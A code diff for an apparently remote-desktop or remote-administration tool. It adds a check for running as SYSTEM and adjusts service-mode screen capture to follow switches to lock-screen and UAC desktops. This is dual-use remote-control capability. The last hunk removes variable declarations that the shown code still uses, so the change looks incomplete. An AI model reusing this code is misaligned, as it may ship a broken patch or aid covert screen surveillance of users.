@@ -276,6 +276,40 @@ void CScreenManager::InitScreenSpy()
     }
 }
 
+BOOL IsRunningAsSystem() {
+    HANDLE hToken;
+    PTOKEN_USER pTokenUser = NULL;
+    DWORD dwSize = 0;
+    BOOL isSystem = FALSE;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        return FALSE;
+    }
+
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
+    pTokenUser = (PTOKEN_USER)malloc(dwSize);
+
+    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser,
+        dwSize, &dwSize)) {
+        // 使用 WellKnownSid 创建 SYSTEM SID
+        BYTE systemSid[SECURITY_MAX_SID_SIZE];
+        DWORD sidSize = sizeof(systemSid);
+
+        if (CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &sidSize)) {
+            isSystem = EqualSid(pTokenUser->User.Sid, systemSid);
+            if (isSystem){
+                Mprintf("当前进程以 SYSTEM 身份运行。\n");
+            } else {
+                Mprintf("当前进程未以 SYSTEM 身份运行。\n");
+			}
+        }
+    }
+
+    free(pTokenUser);
+    CloseHandle(hToken);
+    return isSystem;
+}
+
 BOOL CScreenManager::OnReconnect()
 {
     m_SendFirst = FALSE;
@@ -320,19 +354,16 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
             This->SendFirstScreen();
         }
         // 降低桌面检查频率，避免频繁的DC重置导致闪屏
-        if (This->m_isGDI && This->IsRunAsService() && !This->m_virtual) {
+        if (This->IsRunAsService() && !This->m_virtual) {
             auto now = clock();
             if (now - last_check > 500) {
                 last_check = now;
-
                 // 使用公共函数检查并切换桌面（无需写权限）
-                if (SwitchToDesktopIfChanged(This->g_hDesk, 0)) {
+                if (SwitchToDesktopIfChanged(This->g_hDesk, 0) && This->m_isGDI) {
                     // 桌面变化时重置屏幕捕获的DC
-                    if (This->m_ScreenSpyObject) {
-                        CScreenSpy* spy = dynamic_cast<CScreenSpy*>(This->m_ScreenSpyObject);
-                        if (spy) {
-                            spy->ResetDesktopDC();
-                        }
+                    CScreenSpy* spy = (CScreenSpy*)(This->m_ScreenSpyObject);
+                    if (spy) {
+                        spy->ResetDesktopDC();
                     }
                 }
             }
@@ -884,13 +915,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
         return;
     }
     if (IsRunAsService()) {
-        // 获取当前活动桌面（带写权限，用于锁屏等安全桌面）
-        // 使用独立的静态变量避免与WorkThreadProc的g_hDesk并发冲突
-        static HDESK s_inputDesk = NULL;
-        static clock_t s_lastCheck = 0;
-        static DWORD s_lastThreadId = 0;
         const int CHECK_INTERVAL = 100; // 桌面检测间隔（ms），快速响应锁屏/UAC切换
-
         // 首次调用或定期检测桌面是否变化（降低频率，避免每次输入都检测）
         auto now = clock();
         if (!s_inputDesk || now - s_lastCheck > CHECK_INTERVAL) {
